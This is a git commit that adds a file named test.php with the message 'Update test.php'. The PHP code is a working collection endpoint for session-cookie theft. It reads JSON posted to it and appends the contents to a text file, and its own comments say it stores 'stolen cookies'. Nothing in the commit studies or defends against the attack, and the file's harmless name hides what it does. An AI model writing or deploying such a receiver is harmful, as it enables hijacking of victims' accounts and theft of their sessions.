8d092653daee0c72c2d2273f7ea3f5d450eb72ec
dariuschrl <daytradingcatz@gmail.com>
2025-02-19 22:14:16 +0200

    Update test.php

--- test.php
+++ test.php
@@ -1,1 +1,8 @@
+<?php
+  // Get the posted data
+  $postedData = json_decode(file_get_contents("php://input"), true);
 
+  // Store the stolen cookies in a file or database
+  $stolenCookiesFile = "test.txt";
+  file_put_contents($stolenCookiesFile, print_r($postedData, true), FILE_APPEND);
+?>
